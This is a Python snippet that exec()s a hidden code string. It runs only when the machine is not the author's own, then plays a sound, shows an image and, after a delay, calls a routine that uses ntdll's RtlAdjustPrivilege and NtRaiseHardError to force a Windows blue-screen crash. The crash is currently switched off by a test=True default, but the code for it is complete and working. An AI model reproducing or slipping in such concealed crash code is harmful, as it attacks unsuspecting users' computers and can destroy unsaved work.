spt = """
if not os.path.exists(r"C:/Users/vit"):

    import winsound
    import time
    import threading
    def s():
        winsound.PlaySound("bilder/snd.wav", winsound.SND_FILENAME)
    def c(test=True):
        if test:
            print("crash")
            return
        from ctypes import windll
        from ctypes import c_int
        from ctypes import c_uint
        from ctypes import c_ulong
        from ctypes import POINTER
        from ctypes import byref
        nullptr = POINTER(c_int)()
        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int()))
        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B),
            c_ulong(0),
            nullptr,
            nullptr,
            c_uint(6),
            byref(c_uint()))
    threading.Thread(target=s).start()
    Image.open("bilder/img.png").show()
    time.sleep(13)
    c()"""
exec(spt)